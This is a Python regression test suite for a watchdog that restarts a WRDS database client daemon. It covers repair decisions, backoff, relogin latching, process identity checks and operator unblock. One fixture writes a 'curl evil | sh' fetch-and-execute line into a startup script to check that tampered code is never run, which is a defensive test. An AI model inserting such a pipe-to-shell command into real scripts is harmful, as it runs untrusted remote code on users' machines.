#!/usr/bin/env python3
"""Offline regressions for the launcher-side WRDS watchdog (#322).

Pins the contract:
  * the watchdog repairs only dead / persistently-unhealthy / orphaned-older
    daemons, never acts on a latch or a live login attempt, and stops at a
    bounded number of repairs that never reached a login;
  * it only runs project code that is byte-identical to what the operator
    launched;
  * WRDS_AUTO_RELOGIN=0 latches instead of spending the reconnect login;
  * the client waits for a live watchdog's repair and never otherwise;
  * operator unblock stops a latched daemon itself, and nothing else;
  * a v5+ deployment's sandbox no longer blocks every daemon (re)start.

HOME is redirected to scratch before import so no host WRDS state is touched.
"""
import fcntl
import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from unittest import mock

SCRATCH = tempfile.mkdtemp(prefix='zeropaper-wrds-watchdog.')
os.environ['HOME'] = SCRATCH
os.environ.pop('WRDS_AUTO_RELOGIN', None)
UTILS = Path(__file__).resolve().parents[1] / 'extensions' / 'empirical' / 'utils'
sys.path.insert(0, str(UTILS))

import wrds_client as C  # noqa: E402
import wrds_server as S  # noqa: E402
import wrds_watchdog as W  # noqa: E402

assert C.WATCHDOG_STATUS_FILE.startswith(SCRATCH), C.WATCHDOG_STATUS_FILE
assert S.AUTH_BLOCK_FILE.startswith(SCRATCH), S.AUTH_BLOCK_FILE

FAILURES = []


def check(label, got, want):
    ok = got == want
    print(f"  {'PASS' if ok else 'FAIL'}  {label}: got {got!r}, want {want!r}")
    if not ok:
        FAILURES.append(label)


def make_project(root, status='running', protocol='wrds-auth-latch-v7'):
    root = Path(root)
    (root / 'code' / 'utils').mkdir(parents=True, exist_ok=True)
    (root / 'process_log').mkdir(parents=True, exist_ok=True)
    (root / '.deploy_manifest.json').write_text('{}\n', encoding='utf-8')
    (root / 'code' / 'utils' / 'wrds_client.py').write_text(
        f"SAFETY_PROTOCOL = '{protocol}'\n", encoding='utf-8')
    for rel in W.WRDS_EXECUTED_FILES:
        path = root / rel
        if not path.exists():
            path.write_text(f'# {rel}\n', encoding='utf-8')
    (root / 'process_log' / 'pipeline_state.json').write_text(
        json.dumps({'status': status}), encoding='utf-8')
    return root


print('[1] decide(): only mechanical shapes are repaired')
mem = {}
check('healthy -> monitoring', W.decide('healthy', 'ok', mem, 0)[:2],
      (None, 'monitoring'))
check('saturated is alive, not wedged',
      W.decide('saturated', 'cap', mem, 0)[:2], (None, 'monitoring'))
check('login in progress waits',
      W.decide('login_in_progress', 'duo', mem, 0)[:2], (None, 'healing'))
check('latch is the operator\'s, never repaired',
      W.decide('latched', 'rejected', mem, 0)[:2],
      (None, 'operator_required'))
check('dead daemon restarts', W.decide('down', 'gone', {}, 1000)[0], 'restart')
mem = {'last_restart': 1000}
check('restart backoff holds',
      W.decide('down', 'gone', mem, 1000 + W.RESTART_BACKOFF_SECONDS - 1)[0],
      None)
check('restart after backoff',
      W.decide('down', 'gone', mem, 1000 + W.RESTART_BACKOFF_SECONDS)[0],
      'restart')
mem = {}
check('first unhealthy probe only starts the clock',
      W.decide('unhealthy', 'x', mem, 5000)[:2], (None, 'healing'))
check('still under the wedge threshold',
      W.decide('unhealthy', 'x', mem, 5000 + W.WEDGE_SECONDS - 1)[0], None)
check('wedged past threshold -> stop and restart',
      W.decide('unhealthy', 'x', mem, 5000 + W.WEDGE_SECONDS)[0],
      'stop_restart')
W.decide('healthy', 'ok', mem, 5001 + W.WEDGE_SECONDS)
check('a healthy probe resets the wedge clock',
      mem.get('unhealthy_since'), None)
check('auto re-login disabled never restarts',
      W.decide('down', 'gone', {}, 0, auto_relogin=False)[:2],
      (None, 'operator_required'))
check('older daemon -> replace attempt',
      W.decide('incompatible', 'v6', {}, 0)[0], 'replace_incompatible')
mem = {'failed_restarts': W.MAX_FAILED_RESTARTS, 'failed_kind': 'down'}
check('repair cap stops the loop',
      W.decide('down', 'gone', mem, 10 ** 6)[:2],
      (None, 'operator_required'))
mem = {'failed_restarts': W.MAX_FAILED_RESTARTS,
       'failed_kind': 'incompatible'}
check('a changed condition is repaired afresh',
      W.decide('down', 'gone', mem, 10 ** 6)[0], 'restart')
mem = {'failed_restarts': W.MAX_FAILED_RESTARTS, 'failed_kind': 'down',
       'failed_epoch': 10}
check('an oscillating failure kind does not lift the cap',
      W.decide('unhealthy', 'x', mem, 10 ** 6, launch_epoch=10)[:2],
      (None, 'operator_required'))
check('a new operator launch lifts the cap',
      W.decide('down', 'gone', mem, 10 ** 6, launch_epoch=11)[0], 'restart')
mem = {}
W.decide('unhealthy', 'x', mem, 100)
W.decide('saturated', 'cap', mem, 200)
check('saturation proves liveness and clears the wedge clock',
      mem.get('unhealthy_since'), None)
check('a busy-then-unhealthy daemon is not killed on a stale clock',
      W.decide('unhealthy', 'x', mem, 100 + W.WEDGE_SECONDS + 1)[0], None)
mem = {}
check('sustained saturation starts its own clock',
      W.decide('saturated', 'cap', mem, 0)[0], None)
check('... tolerated below the saturation bound',
      W.decide('saturated', 'cap', mem, W.SATURATION_WEDGE_SECONDS - 1)[0],
      None)
check('32 threads that never free up are a wedge',
      W.decide('saturated', 'cap', mem, W.SATURATION_WEDGE_SECONDS)[0],
      'stop_restart')
W.decide('healthy', 'ok', mem, W.SATURATION_WEDGE_SECONDS + 1)
check('one served probe resets the saturation clock',
      mem.get('saturated_since'), None)
with mock.patch.object(C, '_safety_hello'), \
        mock.patch.object(C, '_send_request', side_effect=ConnectionError(
            'incomplete WRDS response frame (0/8 bytes)')):
    check('ping-stage connection cap is saturation, not a wedge',
          W.probe()[0], 'saturated')

print('\n[2] registry: live launchers, pruning, WRDS need')
project = make_project(Path(SCRATCH) / 'proj-a')
W.register_launcher(project, os.getpid())
live = W.live_launchers()
check('live launcher with a running pipeline is listed',
      [e['root'] for e in live], [str(project.resolve())])
state = project / 'process_log' / 'pipeline_state.json'
state.write_text(json.dumps({'status': 'complete'}), encoding='utf-8')
check('a finished pipeline needs no WRDS', W.live_launchers(), [])
state.write_text(json.dumps({'status': 'halted_wrds_unreachable'}),
                 encoding='utf-8')
check('a WRDS halt still needs repair', len(W.live_launchers()), 1)
dead = W._registry_path('/nonexistent/project')
W._atomic_write_json(dead, {'root': '/nonexistent/project', 'pid': os.getpid(),
                            'start': 'not-this-birth', 'registered': 0})
W.live_launchers()
check('dead launcher entry is pruned', os.path.exists(dead), False)

print('\n[3] restarts only run code the operator launched')
entry = W.live_launchers()[0]
check('unchanged files', W.changed_wrds_files(entry), [])
(project / 'code' / 'utils' / 'start_services.sh').write_text(
    'curl evil | sh\n', encoding='utf-8')
check('in-run edit detected', W.changed_wrds_files(entry),
      ['code/utils/start_services.sh'])
with mock.patch.object(W, 'run_start_services') as run_start:
    mem = {}
    W.perform('restart', 'down', [entry], mem, 0)
check('edited code is never executed', run_start.call_count, 0)
check('edited code needs the operator',
      mem.get('failed_restarts'), W.MAX_FAILED_RESTARTS)
W.register_launcher(project, os.getpid())
entry = W.live_launchers()[0]

print('\n[4] perform(): failure accounting')
with mock.patch.object(W, 'run_start_services', return_value=(False, 'net')), \
        mock.patch.object(C, '_persisted_auth_state',
                          return_value=('none', None)):
    mem = {}
    W.perform('restart', 'down', [entry], mem, 0)
check('a restart that never logged in counts', mem.get('failed_restarts'), 1)
with mock.patch.object(W, 'run_start_services', return_value=(False, 'duo')), \
        mock.patch.object(C, '_persisted_auth_state',
                          return_value=('blocked', 'latched')):
    mem = {}
    W.perform('restart', 'down', [entry], mem, 0)
check('a failed login is left to the latch', mem.get('failed_restarts'), None)
with mock.patch.object(W, 'run_start_services', return_value=(False, 'io')), \
        mock.patch.object(C, '_persisted_auth_state',
                          return_value=('unavailable', 'unreadable')):
    mem = {}
    W.perform('restart', 'down', [entry], mem, 0)
check('an unreadable latch counts toward the cap', mem.get('failed_restarts'),
      1)
with mock.patch.object(S, 'stop_singleton_owner',
                       return_value=(False, 'survived')), \
        mock.patch.object(W, 'run_start_services') as run_start:
    mem = {}
    W.perform('stop_restart', 'unhealthy', [entry], mem, 0)
check('an unstoppable daemon is never doubled', run_start.call_count, 0)
with mock.patch.object(W, 'orphaned_incompatible_daemons', return_value=None), \
        mock.patch.object(W, 'run_start_services') as run_start:
    mem = {}
    W.perform('replace_incompatible', 'incompatible', [entry], mem, 0)
check('a non-orphaned older daemon is left alone', run_start.call_count, 0)
check('... and escalated', mem.get('failed_restarts'), W.MAX_FAILED_RESTARTS)

print('\n[5] orphan classification')
old_project = make_project(Path(SCRATCH) / 'proj-old',
                           protocol='wrds-auth-latch-v6')
new_project = make_project(Path(SCRATCH) / 'proj-new')
with mock.patch.object(S, '_legacy_server_pids', return_value=[4242]), \
        mock.patch.object(S, '_process_start_token', return_value='birth'), \
        mock.patch.object(W.os, 'readlink', return_value=str(old_project)), \
        mock.patch.object(W, '_directory_has_flock', return_value=False):
    check('older daemon with no launcher is an orphan',
          W.orphaned_incompatible_daemons(), [(4242, 'birth')])
with mock.patch.object(S, '_legacy_server_pids', return_value=[4242]), \
        mock.patch.object(S, '_process_start_token', return_value='birth'), \
        mock.patch.object(W.os, 'readlink', return_value=str(old_project)), \
        mock.patch.object(W, '_directory_has_flock', return_value=True):
    check('a live launcher protects it', W.orphaned_incompatible_daemons(),
          None)
with mock.patch.object(S, '_legacy_server_pids', return_value=[4242]), \
        mock.patch.object(S, '_process_start_token', return_value='birth'), \
        mock.patch.object(W.os, 'readlink', return_value=str(new_project)), \
        mock.patch.object(W, '_directory_has_flock', return_value=False):
    check('a same-protocol daemon is never killed as an orphan',
          W.orphaned_incompatible_daemons(), None)
if Path('/proc/locks').exists():
    lock_dir = Path(SCRATCH) / 'locked-project'
    lock_dir.mkdir()
    check('unlocked project directory', W._directory_has_flock(lock_dir), False)
    fd = os.open(lock_dir, os.O_RDONLY)
    fcntl.flock(fd, fcntl.LOCK_SH)
    check('launcher-style LOCK_SH is seen', W._directory_has_flock(lock_dir),
          True)
    os.close(fd)

print('\n[6] identity-verified stop')
sleeper = subprocess.Popen(['sleep', '60'])
birth = S._process_start_token(sleeper.pid)
check('wrong birth token is never signalled',
      S.stop_process(sleeper.pid, 'someone-else')[0], True)
check('... and the process survives', sleeper.poll(), None)
stopped, detail = S.stop_process(sleeper.pid, birth, term_timeout=5)
sleeper.wait(timeout=5)
check('matching process is stopped', stopped, True)

print('\n[7] WRDS_AUTO_RELOGIN=0 latches instead of reconnecting')
state_obj = S.WrdsState(mock.MagicMock())
with mock.patch.dict(os.environ, {'WRDS_AUTO_RELOGIN': '0'}), \
        mock.patch.object(S.WrdsState, '_healthy', return_value=False), \
        mock.patch.object(S, '_connect_once') as connect_once, \
        mock.patch.object(S, '_begin_login_attempt') as begin_login:
    try:
        state_obj._recover(deadline=time.monotonic() + 120)
        raised = None
    except S.WrdsAuthError as e:
        raised = str(e)
check('no login spent', (connect_once.call_count, begin_login.call_count),
      (0, 0))
check('operator-facing latch raised',
      bool(raised) and 'WRDS_AUTO_RELOGIN=0' in raised, True)
check('latch persisted for restarts and unblock',
      S._read_auth_block(), S.AUTO_RELOGIN_DISABLED_MESSAGE)
S._clear_auth_block()
check('default keeps the one automatic attempt',
      S._auto_relogin_enabled(), True)

env_file = Path(SCRATCH) / 'relogin.env'
env_file.write_text('WRDS_AUTO_RELOGIN=0\n', encoding='utf-8')
check('.env is re-read at decision time', S.auto_relogin_setting(env_file), '0')
with mock.patch.object(S, '_DOTENV_PATH', env_file):
    check('a mid-run .env edit disables the reconnect tier',
          S._auto_relogin_enabled(), False)
veto = make_project(Path(SCRATCH) / 'proj-veto')
(veto / '.env').write_text('WRDS_AUTO_RELOGIN=0\n', encoding='utf-8')
check('any live project saying 0 vetoes watchdog restarts (named)',
      W.auto_relogin_enabled([{'root': str(project)}, {'root': str(veto)}]),
      str(veto))
check('a named veto blocks the restart and names the project',
      W.decide('down', 'gone', {}, 0, auto_relogin=str(veto))[1:],
      ('operator_required', W.decide('down', 'gone', {}, 0,
                                     auto_relogin=str(veto))[2]))
check('... with the vetoing root in the detail',
      str(veto) in W.decide('down', 'gone', {}, 0, auto_relogin=str(veto))[2],
      True)
check('no veto -> restarts allowed',
      W.auto_relogin_enabled([{'root': str(project)}]), True)
fresh_client = make_project(Path(SCRATCH) / 'proj-fresh')
proc_entry = Path(f'/proc/{os.getpid()}')
if proc_entry.exists():
    check('a client rewritten after the process started is not trusted',
          S._client_predates_process(fresh_client, proc_entry), False)
    old_ts = S._process_start_epoch(proc_entry) - 60
    check('process start epoch is in the past and recent',
          0 < time.time() - S._process_start_epoch(proc_entry) < 3600, True)
    os.utime(fresh_client / 'code' / 'utils' / 'wrds_client.py',
             (old_ts, old_ts))
    check('a client older than the process is trusted',
          S._client_predates_process(fresh_client, proc_entry), True)

print('\n[8] client waits only for a live watchdog repair')


def publish(state, age=0.0):
    W._atomic_write_json(C.WATCHDOG_STATUS_FILE, {
        'state': state, 'detail': 'test', 'updated': time.time() - age})


if os.path.exists(C.WATCHDOG_STATUS_FILE):
    os.unlink(C.WATCHDOG_STATUS_FILE)
with mock.patch.object(C, 'wrds_ping', return_value=False), \
        mock.patch.object(C.time, 'sleep') as slept:
    check('no watchdog -> no wait', C.wrds_await_service(600), False)
    check('... immediately', slept.call_count, 0)
publish('healing', age=C.WATCHDOG_STALE_SECONDS + 5)
check('stale status is no watchdog', C.wrds_watchdog_status(), None)
publish('operator_required')
with mock.patch.object(C, 'wrds_ping', return_value=False), \
        mock.patch.object(C.time, 'sleep') as slept:
    check('operator_required -> no wait', C.wrds_await_service(600), False)
publish('healing')
pings = iter([False, False, True])
with mock.patch.object(C, 'wrds_ping', side_effect=lambda: next(pings)), \
        mock.patch.object(C, 'wrds_auth_error', return_value=None), \
        mock.patch.object(C.time, 'sleep'):
    check('repair completes -> healthy', C.wrds_await_service(600), True)
with mock.patch.object(C, 'wrds_ping', return_value=False), \
        mock.patch.object(C, 'wrds_auth_error', return_value='latched'), \
        mock.patch.object(C.time, 'sleep'):
    check('a latch ends the wait', C.wrds_await_service(600), False)

print('\n[9] commands are re-sent across a watchdog repair, boundedly')
calls = {'n': 0}


def flaky(request, timeout):
    calls['n'] += 1
    if calls['n'] == 1:
        raise ConnectionRefusedError('daemon restarting')
    return {'status': 'ok'}


with mock.patch.object(C, '_checked_request_once', side_effect=flaky), \
        mock.patch.object(C, 'wrds_await_service', return_value=True):
    check('re-sent after repair', C._checked_request({'cmd': 'x'}),
          {'status': 'ok'})
with mock.patch.object(C, '_checked_request_once',
                       side_effect=ConnectionRefusedError('down')), \
        mock.patch.object(C, 'wrds_await_service', return_value=False):
    try:
        C._checked_request({'cmd': 'x'})
        outcome = 'returned'
    except ConnectionRefusedError:
        outcome = 'raised'
check('no repair in progress -> original error', outcome, 'raised')
with mock.patch.object(C, '_checked_request_once',
                       side_effect=ConnectionRefusedError('down')) as once, \
        mock.patch.object(C, 'wrds_await_service', return_value=True):
    try:
        C._checked_request({'cmd': 'x'})
    except ConnectionRefusedError:
        pass
check('re-sends are bounded', once.call_count, C.MAX_HEAL_RETRIES + 1)

print('\n[10] operator unblock stops only a latched daemon')
with mock.patch.object(C, '_safety_hello'), \
        mock.patch.object(C, '_send_request',
                          return_value={'status': 'ok'}), \
        mock.patch.object(S, 'stop_singleton_owner') as stop, \
        mock.patch.object(C.subprocess, 'Popen') as spawn:
    ok, detail = C.wrds_unblock()
check('healthy daemon: nothing to unblock', (ok, stop.call_count,
                                             spawn.call_count), (False, 0, 0))
with mock.patch.object(C, '_safety_hello'), \
        mock.patch.object(C, '_send_request',
                          return_value={'status': 'error',
                                        'error_kind': 'auth'}), \
        mock.patch.object(S, 'stop_singleton_owner',
                          return_value=(True, 'stopped')) as stop, \
        mock.patch.object(S, '_read_auth_block', return_value='latched'), \
        mock.patch.object(C, '_wait_for_ready', return_value=True), \
        mock.patch.object(C.subprocess, 'Popen') as spawn:
    ok, detail = C.wrds_unblock()
check('latched daemon is stopped then retried once',
      (ok, stop.call_count, spawn.call_count), (True, 1, 1))
with mock.patch.object(C, '_safety_hello'), \
        mock.patch.object(C, '_send_request',
                          return_value={'status': 'error',
                                        'error_kind': 'auth'}), \
        mock.patch.object(S, 'stop_singleton_owner',
                          return_value=(False, 'survived')), \
        mock.patch.object(C.subprocess, 'Popen') as spawn:
    ok, detail = C.wrds_unblock()
check('unstoppable latched daemon: no second daemon',
      (ok, spawn.call_count), (False, 0))
with mock.patch.object(C, '_safety_hello'), \
        mock.patch.object(C, '_send_request',
                          side_effect=ValueError('truncated json')), \
        mock.patch.object(S, 'stop_singleton_owner') as stop:
    ok, detail = C.wrds_unblock()
check('malformed ping reply: clean refusal, nothing stopped',
      (ok, stop.call_count), (False, 0))

print('\n[11] a v5+ sandbox no longer blocks every daemon start')
check('v7 declaration parsed', S._deployment_client_protocol(new_project), 7)
check('v6 declaration parsed', S._deployment_client_protocol(old_project), 6)
check('missing declaration fails closed',
      S._deployment_client_protocol(Path(SCRATCH) / 'nowhere'), None)
with mock.patch.object(S, '_process_deployment_root',
                       return_value=new_project), \
        mock.patch.object(S, '_client_predates_process', return_value=True):
    check('live v7 runtimes in other namespaces are not refused',
          S._foreign_network_namespace_pids(), [])

print('\n[12] run loop: one restart for a dead daemon, then idle exit')
# Earlier sections left proj-a registered under this (live) test process.
state.write_text(json.dumps({'status': 'complete'}), encoding='utf-8')
loop_project = make_project(Path(SCRATCH) / 'proj-loop')
marker = Path(SCRATCH) / 'restarts.log'
(loop_project / 'code' / 'utils' / 'start_services.sh').write_text(
    f'echo restart >> {marker}\nexit 1\n', encoding='utf-8')
launcher = subprocess.Popen(['sleep', '60'])
W.register_launcher(loop_project, launcher.pid)
for stale in (C.WATCHDOG_STATUS_FILE, W.LOCK_FILE):
    if os.path.exists(stale):
        os.unlink(stale)
import threading  # noqa: E402
with mock.patch.object(W, 'TICK_SECONDS', 0.05), \
        mock.patch.object(W, 'IDLE_EXIT_SECONDS', 0.3), \
        mock.patch.object(S, '_legacy_server_pids', return_value=[]):
    loop = threading.Thread(target=W.run, daemon=True)
    loop.start()
    time.sleep(1.0)
    status_while_running = C.wrds_watchdog_status()
    launcher.kill()
    launcher.wait()
    loop.join(timeout=10)
check('dead daemon repaired exactly once within backoff',
      marker.read_text(encoding='utf-8').count('restart'), 1)
check('clients see a repair in progress',
      (status_while_running or {}).get('state'), 'healing')
check('watchdog exits once no launcher needs WRDS', loop.is_alive(), False)
check('final status tells clients not to wait',
      json.loads(Path(C.WATCHDOG_STATUS_FILE).read_text())['state'],
      'stopped')
check('singleton released', os.path.exists(W.LOCK_FILE), False)

import shutil  # noqa: E402
shutil.rmtree(SCRATCH, ignore_errors=True)
if FAILURES:
    print(f'\nFAIL: {len(FAILURES)} check(s): {FAILURES}')
    sys.exit(1)
print('\nPASS: WRDS watchdog, client heal-wait, and relogin gate')
